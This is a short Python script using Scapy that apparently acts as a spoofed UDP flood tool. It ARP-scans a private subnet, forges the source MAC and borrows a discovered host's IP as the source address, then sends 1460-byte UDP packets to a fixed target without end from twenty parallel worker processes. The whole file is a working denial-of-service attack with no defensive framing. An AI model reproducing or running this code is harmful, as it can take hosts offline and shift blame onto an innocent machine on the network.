from multiprocessing import Process, Pool
from scapy.all import *

ether_pkt = None
ip_pkt = None
ip_addr = []
send_packet= None

def send_packets():
	global send_packet
	sendp(send_packet, count=1000, inter=0)

def input_details():
	global ip_pkt
	global ether_pkt
	global ip_addr
	global data
	global send_packet

	# subnet_addr = raw_input("Enter subnet address (192.168.1.0/24) :- ")
	# dst_ip = raw_input("Enter destination ip :- ")

	# ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet_addr),timeout=2)
	ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="172.16.0.0/23"),timeout=2)
	
	ans.summary(lambda(sender,receiver): ip_addr.append(sender.pdst))

	ether_pkt = Ether()
	ether_pkt.src = "00:00:01:02:05:05"
	ether_pkt.display()

	payload = "X"*1460
	ip_pkt = IP(proto=17)/UDP(len=104)/payload
	# ip_pkt.dst = dst_ip
	ip_pkt.dst = "172.16.0.86"

	ip_pkt.src = ip_addr[0]
	# ip_pkt.src = "172.16.0.72"
	send_packet = ether_pkt/ip_pkt

def main():
	input_details()
	pool = Pool(processes=20)
	while True:
		pool.apply_async(send_packets)

if __name__ == '__main__':
	main()